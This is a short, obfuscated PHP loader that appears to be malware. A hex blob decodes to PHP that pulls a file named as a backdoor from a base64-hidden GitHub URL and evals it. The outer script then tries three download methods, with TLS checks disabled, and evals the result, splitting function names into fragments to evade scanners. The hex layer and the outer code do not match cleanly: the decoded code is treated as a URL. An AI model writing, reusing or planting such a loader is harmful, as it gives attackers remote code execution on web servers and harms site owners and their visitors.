<?php
$hexUrl = '3C3F704870200D0A20202066756E6374696F6E20676574282475726C29207B200D0A20202020246368203D206375726C5F696E697428293B200D0A200D0A202020206375726C5F7365746F7074282463682C204355524C4F50545F4845414445522C2030293B200D0A202020206375726C5F7365746F7074282463682C204355524C4F50545F52455455524E5452414E534645522C2031293B200D0A202020206375726C5F7365746F7074282463682C204355524C4F50545F55524C2C202475726C293B200D0A200D0A202020202464617461203D206375726C5F6578656328246368293B200D0A202020206375726C5F636C6F736528246368293B200D0A200D0A2020202072657475726E2024646174613B200D0A7D200D0A24783D20273F3E273B200D0A2020202020206576616C282478202E20676574286261736536345F6465636F646528276148523063484D364C793979595863755A326C306148566964584E6C636D4E76626E526C626E5175593239744C306468626D567A64464E6C646D56754C324A685932746B623239794C573170626D6B76636D566D6379396F5A57466B6379397459576C754C7A457563476877272929293B200D0A3F3E';

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

$url = hex2str($hexUrl);

function downloadWithFileGetContents($url) {
    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
        return file_get_contents($url);
    }
    return false;
}

function downloadWithCurl($url) {
    if (function_exists('c' . 'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

function downloadWithFopen($url) {
    $result = false;
    if ($fp = fopen($url, 'r')) {
        $result = '';
        while ($data = fread($fp, 8192)) {
            $result .= $data;
        }
        fclose($fp);
    }
    return $result;
}

$phpScript = downloadWithFileGetContents($url);
if ($phpScript === false) {
    $phpScript = downloadWithCurl($url);
}
if ($phpScript === false) {
    $phpScript = downloadWithFopen($url);
}

if ($phpScript === false) {
    die("Gagal mendownload script PHP dari URL dengan semua metode.");
}

eval('?>' . $phpScript);
?>
